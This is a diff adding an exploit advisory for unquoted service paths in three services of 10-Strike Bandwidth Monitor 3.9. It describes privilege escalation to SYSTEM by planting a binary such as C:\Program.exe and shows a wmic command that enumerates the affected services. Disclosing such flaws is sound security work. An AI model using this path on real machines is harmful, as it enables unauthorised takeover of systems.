@@ -1,0 +1,20 @@
+# Exploit Title: Bandwidth Monitor 3.9 - 'Svc10StrikeBandMontitor' Unquoted Service Path
+# Exploit Author: Bobby Cooke
+# Date: 2020-07-15
+# Vendor Site: https://www.10-strike.com/
+# Software Download: https://www.10-strike.com/bandwidth-monitor/bandwidth-monitor.exe
+# Tested On: Windows 10 - Pro 1909 (x86)
+# Version: Version 3.9
+
+# Vulnerability Type: 
+# Local Privilege Escalation to LocalSystem by Unquoted Service Path.
+
+# Vulnerability Description:
+# The 10-Strike Bandwidth Monitor v3.9 services "Svc10StrikeBandMontitor", "Svc10StrikeBMWD", and "Svc10StrikeBMAgent" suffer 
+# from unquoted service path vulnerabilities that allow attackers to achieve Privilege Escalation to SYSTEM, at startup, 
+# by placing a malicious binary in the truncated service path; such as "C:\Program.exe".
+
+C:\Users\boku>wmic service get name,pathname,startmode,StartName | findstr "10-Strike Bandwidth Monitor"
+Svc10StrikeBandMonitor    C:\Program Files\10-Strike Bandwidth Monitor\BMsvc.exe          Auto   LocalSystem
+Svc10StrikeBMWD           C:\Program Files\10-Strike Bandwidth Monitor\BMWDsvc.exe        Auto   LocalSystem
+Svc10StrikeBMAgent        C:\Program Files\10-Strike Bandwidth Monitor Agent\BMAgent.exe  Auto   LocalSystem
